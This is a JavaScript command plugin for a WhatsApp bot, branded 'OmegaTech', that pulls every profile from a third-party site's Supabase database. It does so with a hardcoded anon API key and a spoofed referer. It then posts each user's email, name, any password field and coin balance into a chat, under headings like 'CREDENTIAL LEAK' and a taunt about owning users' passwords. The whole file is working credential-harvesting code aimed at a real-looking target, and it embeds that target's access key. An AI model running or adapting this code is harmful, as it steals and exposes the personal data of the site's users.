import axios from 'axios';

const CONFIG = {
    API_URL: "https://vnuturzxvxkjbkawgnpf.supabase.co",
    API_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZudXR1cnp4dnhramJrYXdnbnBmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTcxMzQsImV4cCI6MjA4NDU5MzEzNH0.v1pLqnN0VuYAeCSqKU3KEbGxam-hIc0md31WPhEiImQ",
    REFERER: "https://denki-toolweb.lovable.app/"
};

const headers = {
    "accept": "*/*",
    "apikey": CONFIG.API_KEY,
    "content-type": "application/json",
    "Referer": CONFIG.REFERER
};

const handler = async (m, { conn }) => {
    await m.react('🔑');
    const { key } = await conn.sendMessage(m.chat, { text: `📡 _Deep-Scanning Database for Credentials..._` }, { quoted: m });

    try {
        // Fetch everything from profiles
        const response = await axios.get(
            `${CONFIG.API_URL}/rest/v1/profiles?select=*&order=created_at.desc`,
            { headers }
        ).catch(e => { throw new Error(`Access Denied: ${e.response?.data?.message || e.message}`) });

        const users = response.data || [];

        if (users.length === 0) {
            return await conn.sendMessage(m.chat, { text: "❌ Search Complete: No profiles found.", edit: key });
        }

        let report = `🔓 *OMEGATECH CREDENTIAL LEAK* ✅\n`;
        report += `Nodes Scanned: ${users.length}\n`;
        report += `──────────────────\n\n`;

        users.forEach((user, i) => {
            // Identity Check
            const email = user.email || user.username || 'No Email';
            const name = user.full_name || user.display_name || 'N/A';
            
            /** * SEARCHING FOR PASSWORD FIELDS
             * Note: If the column is not named 'password', it won't show.
             **/
            const pass = user.password || user.pass || user.credential || '******** (Encrypted)';
            const coins = (user.coins || 0).toLocaleString();

            report += `*USER #${i + 1}: ${name.toUpperCase()}*\n`;
            report += `📧 Mail: \`${email}\`\n`;
            report += `🔑 Pass: \`${pass}\`\n`;
            report += `💰 Bal : ${coins} coins\n`;
            report += `──────────────────\n`;
        });

        report += `\n_Note: All your passwords will be mine "Encrypted", OmegaTech reign._`;

        await conn.sendMessage(m.chat, { 
            text: report,
            edit: key,
            contextInfo: {
                externalAdReply: {
                    title: `SECURITY BREACH: ${users.length} NODES`,
                    body: `Target: profiles_auth_table`,
                    mediaType: 1,
                    showAdAttribution: true
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363243543411475@newsletter',
                    newsletterName: `OmegaTech Security ✅`,
                }
            }
        });

    } catch (e) {
        await conn.sendMessage(m.chat, { text: `❌ *Terminal Error:* ${e.message}`, edit: key });
    }
};

handler.help = ['showcreds'];
handler.tags = ['owner'];
handler.command = /^(showcreds|leak|passwords)$/i;

export default handler;